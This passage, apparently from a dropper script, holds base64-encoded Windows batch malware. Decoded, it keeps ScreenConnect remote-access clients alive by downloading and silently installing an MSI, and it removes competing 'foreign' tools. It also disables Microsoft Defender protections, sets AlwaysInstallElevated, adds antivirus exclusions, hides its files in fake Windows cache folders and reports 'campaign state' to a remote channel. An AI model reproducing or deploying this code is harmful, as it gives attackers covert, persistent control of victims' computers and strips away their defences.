LUJ1aWxkICVNT05WRVIlIC1FeHRyYSAibXNpLWZhaWxlZCIgPm51bCAyPiYxCiAgY2FsbCA6VGdT
dGF0ZSBGQUlMICJNU0kgaW5zdGFsbCBmYWlsZWQgb24gYWxsIHNvdXJjZXMgKG1zaWV4ZWMgZXhp
dCAlTVNJRVhJVCUpIgopIGVsc2UgKAogIGVjaG8gc3ZjIHJlc3RvcmVkPj4iJUxPRyUiCiAgcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIg
LUJ1aWxkICVNT05WRVIlIC1FeHRyYSAicmVzdG9yZWQiID5udWwgMj4mMQogIGNhbGwgOlRnU3Rh
dGUgUkVTVE9SRUQgIlNjcmVlbkNvbm5lY3QgcmVpbnN0YWxsZWQgT0siCikKCjpBZnRlckhlYWwK
cmVtIE0xNjogQUxUIHByZXNlbnQtYnV0LXN0b3BwZWQgLT4gcmVzdGFydCwgdGhlbiByZXBhaXIt
YnktR1VJRCAoZXZlcnkgdGljaykKc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxU
X0ZQJSkiID5udWwgMj4mMQppZiBub3QgZXJyb3JsZXZlbCAxICgKICBzYyBxdWVyeSAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsCiAgaWYgZXJy
b3JsZXZlbCAxICgKICAgIGVjaG8gYWx0IHN0b3BwZWQgLSByZXN0YXJ0L3JlcGFpcj4+IiVMT0cl
IgogICAgbmV0IHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+
JjEKICAgIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+
JjEKICAgIHRpbWVvdXQgL3QgNSAvbm9icmVhayA+bnVsCiAgICBzYyBxdWVyeSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsCiAgICBpZiBlcnJv
cmxldmVsIDEgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmls
ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
X2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+
PiIlTE9HJSIgMj4mMQogICkKKQpyZW0gTTE3OiBBTFQgc2VydmljZSBlbnRyeSBkZWxldGVkIGJ1
dCBwcm9kdWN0IHJlZ2lzdGVyZWQgLT4gcmVwYWlyLWJ5LUdVSUQgZXZlcnkgdGljawpzYyBxdWVy
eSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxCmlmIGVycm9ybGV2
ZWwgMSAoCiAgZWNobyBhbHRfbWlzc2luZ190cnlfcmVwYWlyPj4iJUxPRyUiCiAgaWYgZXhpc3Qg
IiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24g
cmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQopCnJl
bSAoZXh0ZXJtaW5hdGlvbiBhbHJlYWR5IHJhbiBwcmUtaGVhbCBpbiBbRV07IGZvcmVpZ24gc3Vy
dml2b3JzIGNvdW50ZWQgdGhlcmUpCgpyZW0g4pSA4pSAIFtGXSBzdGVhbHRoIHJlLXNlY3VyZSAo
cXVpZXQgRGVmZW5kZXIgZXhjbHVzaW9uIHJlZnJlc2gpIOKUgOKUgApwb3dlcnNoZWxsIC1Ob1By
b2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICJ0
cnkgeyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICclV0QlJywnJUVUTCUnIC1FcnJv
ckFjdGlvbiBTdG9wIH0gY2F0Y2gge30iID5udWwgMj4mMQoKcmVtIOKUgOKUgCBbR10gcGVyaW9k
aWMgZnVsbCByZS1zZWN1cmUgZXZlcnkgfjIgaCDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
b25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAnJVdEJVxvd25fc2VjdXJlLmNt
ZCcpIC1hbmQgKCggLW5vdCAoVGVzdC1QYXRoICclV0QlXHNlYy5mbGFnJykpIC1vciAoKChHZXQt
RGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclV0QlXHNlYy5mbGFnJykuTGFzdFdyaXRl
VGltZSkuVG90YWxIb3VycyAtZ2UgMikpKXsgZXhpdCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVs
IDI+JjEKaWYgZXJyb3JsZXZlbCAxICgKICBlY2hvIHBlcmlvZGljIHJlLXNlY3VyZT4+IiVMT0cl
IgogIGNhbGwgIiVXRCVcb3duX3NlY3VyZS5jbWQiID4+IiVMT0clIiAyPiYxCiAgZWNobyBkb25l
PiIlV0QlXHNlYy5mbGFnIgopCgpyZW0g4pSA4pSAIFtIXSBjYW1wYWlnbiBzdGF0ZSArIGhvdXJs
eSBjb21wYWN0IGRpZ2VzdCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIAKaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmls
ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
X2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSA+
bnVsIDI+JjEKcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAi
aWYoKFRlc3QtUGF0aCAnJUhCRkxBRyUnKSAtYW5kIChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQt
SXRlbSAtTGl0ZXJhbFBhdGggJyVIQkZMQUclJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVz
IC1sdCA2MCl7IGV4aXQgMCB9IGVsc2UgeyBleGl0IDEgfSIgPm51bCAyPiYxCmlmIGVycm9ybGV2
ZWwgMSAoCiAgZWNobyBoYj4lSEJGTEFHJQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBz
MSIgLVN0YXRlIEhCIC1Nb2RlIGNvbXBhY3QgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAhQ09VTlQh
ID5udWwgMj4mMQogIGVjaG8gZGlnZXN0IEhCIHNlbnQ+PiIlTE9HJSIKKQoKcmVtIOKUgOKUgCBb
SV0gc2VsZi11cGRhdGUgYXBwbHkgKGxhc3QgdGhpbmcgdGhpcyB0aWNrKSDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKaWYgIiVTRUxGX1VQRCUiPT0iMSIgKAogIGVj
aG8gc2VsZi11cGRhdGUgYXBwbHk+PiIlTE9HJSIKICBhdHRyaWIgLWggLXMgLXIgIiVXRCVcb3du
X21vbi5jbWQiID5udWwgMj4mMQogIG1vdmUgL3kgIiVXRCVcb3duX21vbi5uZXh0IiAiJVdEJVxv
d25fbW9uLmNtZCIgPm51bCAyPiYxCikKcmVtIGtlZXAgZHVhbC1wYXRoIGJhY2t1cCBpbiBzeW5j
IGV2ZXJ5IHRpY2sKaWYgbm90IGV4aXN0ICIlRVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjEK
aWYgZXhpc3QgIiVXRCVcb3duX21vbi5jbWQiICgKICBhdHRyaWIgLWggLXMgLXIgIiVFVEwlXGV0
bF9tb24uY21kIiA+bnVsIDI+JjEKICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVc
ZXRsX21vbi5jbWQiID5udWwgMj4mMQopCmRlbCAvZiAvcSAiJU1VVEVYJSIgPm51bCAyPiYxCgpl
Y2hvIHRpY2sgZG9uZTogcHJpbT0lUFJJTV9PSyUgYWx0PSVBTFRfT0slIGZvcmVpZ249JUZPUkVJ
R05fTEVGVCU+PiIlTE9HJSIKZW5kbG9jYWwKZXhpdCAvYiAwCgpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIGhlbHBlcnMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCjpJbnN0YWxsTXNpCnJlbSAlMT11cmwgJTI9dGFn
CnNldCAiVVJMPSV+MSIKc2V0ICJUQUc9JX4yIgplY2hvIFslVEFHJV0gZmV0Y2ggJVVSTCU+PiIl
TE9HJSIKIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDI1IC0t
bWF4LXRpbWUgMzAwIC1vICIlTVNJJS50bXAiICIlVVJMJSIgPj4iJUxPRyUiIDI+JjEKZm9yICUl
RiBpbiAoIiVNU0klLnRtcCIpIGRvIGlmICUlfnpGIExFUSAxMDAwMDAwICgKICBlY2hvIFslVEFH
JV0gZmV0Y2ggZmFpbGVkPj4iJUxPRyUiCiAgZGVsIC9mIC9xICIlTVNJJS50bXAiID5udWwgMj4m
MQogIGV4aXQgL2IgMQopCm1vdmUgL3kgIiVNU0klLnRtcCIgIiVNU0klIiA+bnVsIDI+JjEKY2Fs
bCA6Tm9Nc2lQb2xpY3kKcmVtIE0xMzogc3RhbGUgcHJpbWFyeSBkaXIgKHNlcnZpY2UgZGVsZXRl
ZCwgcHJvZHVjdCB1bnJlZ2lzdGVyZWQpIGJyZWFrcwpyZW0gdGhlIFNDIGluc3RhbGxlciBjdXN0
b20gYWN0aW9uIC0gY2xlYXIgaXQgYmVmb3JlIGluc3RhbGxpbmcKc2MgcXVlcnkgIlNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxIGlmIGV4
aXN0ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiICgKICBlY2hvIHN0
YWxlX3ByaW1hcnlfZGlyX2NsZWFuPj4iJUxPRyUiCiAgcm1kaXIgL3MgL3EgIiVQRjg2JVxTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxCikKZWNobyBbJVRBRyVdIG1z
aWV4ZWMgaW5zdGFsbD4+IiVMT0clIgptc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQg
QUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ci
ID5udWwgMj4mMQpzZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIgplY2hvIFslVEFHJV0gbXNpZXhl
YyBleGl0PSFNU0lFWElUIT4+IiVMT0clIgppZiAiIU1TSUVYSVQhIj09IjE2MTgiICgKICBlY2hv
IFslVEFHJV0gbXNpX2J1c3lfcmV0cnk+PiIlTE9HJSIKICB0aW1lb3V0IC90IDMwIC9ub2JyZWFr
ID5udWwKICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJP
T1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbDIubG9nIiA+bnVsIDI+JjEKICBz
ZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIgogIGVjaG8gWyVUQUclXSBtc2lleGVjX3JldHJ5IGV4
aXQ9IU1TSUVYSVQhPj4iJUxPRyUiCikKY2FsbCA6V2FpdFN2YwpleGl0IC9iIDAKCjpSZXBhaXJS
ZWdpc3RlcmVkCnJlbSAlMT1maW5nZXJwcmludCAtIHNlcnZpY2UgZGVsZXRlZCBidXQgcHJvZHVj
dCByZWdpc3RlcmVkOiByZXBhaXIgYnkgR1VJRC4Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xp
ZW50ICglfjEpIiA+bnVsIDI+JjEKaWYgbm90IGVycm9ybGV2ZWwgMSBleGl0IC9iIDAKaWYgbm90
IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBleGl0IC9iIDEKcG93ZXJzaGVsbCAtTm9Qcm9maWxl
IC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25f
bGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlfjEiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9H
JSIgMj4mMQpjYWxsIDpXYWl0U3ZjCmV4aXQgL2IgMAoKOlJlc3RvcmVBbHQKcmVtIEFMVCBzZXJ2
aWNlIGdvbmUgYnV0IHN0aWxsIHJlZ2lzdGVyZWQgKFNDLWZhbWlseSBtc2lleGVjIHNpZGUgZWZm
ZWN0KSAtIHJlcGFpciBpdCB0b28uCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFM
VF9GUCUpIiA+bnVsIDI+JjEKaWYgbm90IGVycm9ybGV2ZWwgMSBleGl0IC9iIDAKZWNobyBhbHQg
bWlzc2luZyAtIHJlcGFpciBhdHRlbXB0Pj4iJUxPRyUiCmlmIGV4aXN0ICIlV0QlXG93bl9saWIu
cHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVB
TFRfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEKc2MgcXVlcnkgIlNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bAppZiBub3QgZXJy
b3JsZXZlbCAxIHNldCAiQUxUX09LPTEiCmV4aXQgL2IgMAoKOk5vTXNpUG9saWN5CnJlZyBkZWxl
dGUgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQpyZWcgZGVsZXRlICJIS0NVXFNPRlRXQVJFXFBvbGlj
aWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVsIDI+
JjEKcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0
YWxsZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxCmV4aXQg
L2IgMAoKOldhaXRTdmMKc2V0ICJUUklFUz0wIgo6V2FpdExvb3AKc2MgcXVlcnkgIlNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwKaWYgbm90IGVy
cm9ybGV2ZWwgMSAoCiAgc2V0ICJJTlNUQUxMRUQ9MSIKICBzZXQgIlBSSU1fT0s9MSIKICBleGl0
IC9iIDAKKQpzZXQgL2EgVFJJRVMrPTEKaWYgJVRSSUVTJSBHRVEgMTAgZXhpdCAvYiAxCnBpbmcg
MTI3LjAuMC4xIC1uIDcgPm51bCAyPiYxCmdvdG8gOldhaXRMb29wCgo6VGdTdGF0ZQpzZXQgIk5F
V1NUQVRFPSV+MSIKc2V0ICJNU0c9JX4yIgpzZXQgIk9MRFNUQVRFPSIKaWYgZXhpc3QgIiVTVEFU
RSUiIHNldCAvcCBPTERTVEFURT08IiVTVEFURSUiCnJlbSByYXRlLWxpbWl0IHJlcGVhdGVkIERP
V04vRkFJTDogbWF4IDEgYWxlcnQgcGVyIDMwIG1pbiB3aGlsZSBzdHVjawppZiAvSSAiJU5FV1NU
QVRFJSI9PSJET1dOIiBnb3RvIDpNYXliZVN1cHByZXNzCmlmIC9JICIlTkVXU1RBVEUlIj09IkZB
SUwiIGdvdG8gOk1heWJlU3VwcHJlc3MKZ290byA6U2VuZEFsZXJ0CjpNYXliZVN1cHByZXNzCmlm
IC9JICIlTkVXU1RBVEUlIj09IiVPTERTVEFURSUiIGlmIGV4aXN0ICIlV0QlXHRnX3NlbnQuZmxh
ZyIgKAogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlm
KChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVXRCVcdGdfc2Vu
dC5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCAzMCl7ZXhpdCAwfWVsc2V7
ZXhpdCAxfSIgPm51bCAyPiYxCiAgaWYgbm90IGVycm9ybGV2ZWwgMSAoCiAgICBlY2hvIHRnX3N1
cHByZXNzZWRfJU5FV1NUQVRFJT4+IiVMT0clIgogICAgZXhpdCAvYiAwCiAgKQopCjpTZW5kQWxl
cnQKZWNobyAlTkVXU1RBVEUlPiIlU1RBVEUlIgplY2hvIHNlbnQ+IiVXRCVcdGdfc2VudC5mbGFn
Igpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kg
QnlwYXNzIC1GaWxlICIlV0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0ZSAlTkVXU1RBVEUlIC1TdW1t
YXJ5ICIlTVNHJSIgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09VTlQlID5udWwgMj4mMQplY2hv
IHRnIHN0YXRlICVORVdTVEFURSUgc2VudD4+IiVMT0clIgpleGl0IC9iIDAK
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM2IC0gaWRlbnRpdHktYXdh
cmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBleGNsdXNpb25zL0FDTDsgbm8g
YXR0ci1sb2NrIG9uIG11dGFibGUgcGF5bG9hZHMNCnNldGxvY2FsIEVuYWJsZUV4dGVuc2lvbnMg
RW5hYmxlRGVsYXllZEV4cGFuc2lvbg0Kc2V0ICJXRD0lUHJvZ3JhbURhdGElXE1pY3Jvc29mdFxX
aW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJXRDI9JVByb2dyYW1EYXRhJVxNaWNyb3Nv
ZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZSINCnNldCAiTE9HPSVXRCVcYm9vdC5lcnIiDQpz
ZXQgIlBSSU09U2NyZWVuQ29ubmVjdCBDbGllbnQgKDVmNjAxMDU3OTg1MmU1MDcpIg0Kc2V0ICJB
TFQ9U2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpIg0Kc2V0ICJLRUVQMT01
ZjYwMTA1Nzk4NTJlNTA3Ig0Kc2V0ICJLRUVQMj1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0ICJQRj0l
UHJvZ3JhbUZpbGVzJSINCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIg0Kc2V0ICJUQVNL
Uk9PVD0lU3lzdGVtUm9vdCVcU3lzdGVtMzJcVGFza3MiDQoNCmlmIG5vdCBleGlzdCAiJVdEJSIg
bWtkaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QyJSIgbWtkaXIgIiVXRDIl
IiA+bnVsIDI+JjENCmVjaG8gc2VjdXJlX2JlZ2luICVEQVRFJSAlVElNRSUgUzY+PiIlTE9HJSIN
Cg0KUkVNIC0tLSBOZXV0cmFsaXplIE1TSSBibG9jayBwb2xpY2llcyAoMTYyNSkgLS0tDQpSRU0g
RGlzYWJsZU1TSTogMD1hbGxvdywgMT1ub24tYWRtaW4gb25seSwgMj1hbGwgLT4gZm9yY2UgMA0K
cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3Yg
QWx3YXlzSW5zdGFsbEVsZXZhdGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVn
IGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0NVXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW5zdGFsbEVsZXZh
dGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KDQpSRU0gLS0tIERlZmVuZGVyOiBy
ZWdpc3RyeSBleGNsdXNpb25zIChwb2xpY3kgKyBwcmVmZXJlbmNlIGtleXMpIC0tLQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3Yg
RGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdP
UkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwt
VGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlSU9BVlByb3RlY3Rpb24gL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0
U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
V0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdB
UkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRDIl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIkM6XFdpbmRv
d3NcVGVtcCIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
VEVNUCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZU
V0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5u
dWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAy
JSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51
bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
MiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMu
ZXhlIGN1cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNv
bm5lY3QuQ2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkg
ZG8gKA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
IDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2Vy
IHRoYW4gcmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlv
blByZWZlcmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVu
Y2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURp
c2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJ
T0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5u
aW5nICR0cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2lu
ZG93c1xUZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUp
JywnJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
UDIlKScpOyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJv
Z3JhbUZpbGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEg
